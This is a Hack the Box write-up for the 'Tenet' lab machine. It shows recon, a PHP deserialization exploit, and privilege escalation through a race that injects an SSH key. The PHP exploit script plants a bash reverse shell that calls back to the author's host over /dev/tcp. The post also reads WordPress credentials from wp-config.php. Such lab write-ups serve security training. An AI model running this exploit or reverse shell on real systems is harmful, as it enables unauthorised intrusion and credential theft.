+++
author = "Nick"
categories = ["hack the box", "Linux", "medium", "serialization", "PHP", "PHP Deserialization", "ssh"]
date = 2021-06-12T15:00:00Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2021/06/tenet.png"
slug = "hack-the-box-tenet"
summary = "Welcome back! Today we will be doing the Hack the Box machine - Tenet. This is listed as a medium Linux box, let's see what's in store!"
tags = ["hack the box", "Linux", "medium", "serialization", "PHP", "PHP Deserialization", "ssh"]
title = "Hack the Box - Tenet"

+++


Welcome back! Today we will be doing the Hack the Box machine - Tenet. This is listed as a medium Linux box, let's see what's in store!

As usual, start the recon with `nmap`.

```
Nmap scan report for 10.10.10.223
Host is up (0.048s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Not much of a path forward, let's see what we can find on port 80. When we browse over to port 80, we see a standard `Apache` install page. We'll start sniffing around with `gobuster` to see what we can find.

Command:
`gobuster dir -u 'http://10.10.10.233' -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 60`

Nothing out of the ordinary was found, damn. A quick vhost enumeration with `nmap` didn't reveal anything either. In this case we're just going to add tenet.htb to our host lists to see if anything resolves.

Sure enough we get a blog site. We'll repeat the same `gobuster` command from about but using our vhost.

Command:
`gobuster dir -u 'http://10.10.10.233' -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 60`

The enumeration shows us that we've working with a Wordpress site. Digging around gives us two users, `protagonist` and `neil`. Neil gives us one comment in particular that is interesting:

![](/images/2021/06/image.png)

So, we should start looking for `.php` and `.bak` / `.back` files. As well as any items named `sator`. Since this list is small, we can check these by hand by checking our vhost and IP for these file names. The reason we do both IP and Vhost is because there are possibly more Vhosts than we know that could resolve to the IP.

Sure enough, the `10.10.10.223/sator.php` finds a hit:

![](/images/2021/06/image-1.png)

Along side that, so does the `.bak`:

![](/images/2021/06/image-2.png)

Now that we've downloaded the file, we can take a look at it.

![](/images/2021/06/image-3.png)

Looks like we're taking a repo, `arepo`, which is serialized and unserializing it. Looks like we're using a magic method here, `__destruct()`. `PHP Deserialization` is a common thing to see in HTB as well as other CTF's. It's also still realivant to real life applications (unfortunately). Here's some more info on the topic:

* https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
* https://kishanchoudhary.com/OSWE/php_obj.html
* https://notsosecure.com/remote-code-execution-via-php-unserialize/

We have a few ways to leverage this. We can create a script to call to the `sator.php` URL and run it with PHP locally to gain an RCE that way, or we can can create a serialized value and feed it to `sator.php` URL, let it create the RCE file and then browse to it.

First, let's create the script, which we just copy the first part of the above script:

```php
<?php
class DatabaseExport
{
    public $user_file = 'tenet_5.php';
    public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.89/7070 0>&1\'"); ?>';

        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated';
        }
}

$url = 'http://10.10.10.223/sator.php?arepo=' . urlencode(serialize(new DatabaseExport));
$r = file_get_contents("$url");
$r = file_get_contents("http://10.10.10.223/tenet_5.php");

?>
```
I really dislike `PHP`, just saying. What we did here is simply added a `URL` variable and a `response` variable to take our serialized data and feed it to the endpoint. You could just get the output of the function and `curl` to the endpoint to trigger it as well.

Command:
`nc -lvnp 7070`
`php tenet.php`

![](/images/2021/06/tenetshell.gif)

We get a shell back! Now we can start to look around and enumerate internally. Right where we land when we get a shell, we see a directory called `Wordpress`. Inside there's the `wp-config.php` file, with credentials for `neil`.

![](/images/2021/06/image-4.png)

Now we can try to login via `ssh` as `neil`. It works, we're in as `neil` and grab the `users.txt` flag! The first thing we always do once we get a user foothold on a box is `sudo -l`. This gives us an idea:

![](/images/2021/06/image-5.png)

We check the script, the `addKey()` function is our target in this case.

![](/images/2021/06/image-6.png)

We can write a `while` loop to keep adding our `ssh` key to any ssh files in tmp. First generate a new ssh key:

Command:
`ssh-keygen`

Now we can write our script:

```bash
while true; do echo "SSH-KEY-HERE" | tee /tmp/ssh* > /dev/null; done
```

Once we run the command, we open a new terminal and try to connect with our new key.

Command:
`ssh -i id_rsa root@tenet.htb`

Boom, we get in!

![](/images/2021/06/image-7.png)

Another fun box down! If you found this write-up useful, send some respect my way:[https://app.hackthebox.eu/profile/95635](https://app.hackthebox.eu/profile/95635)

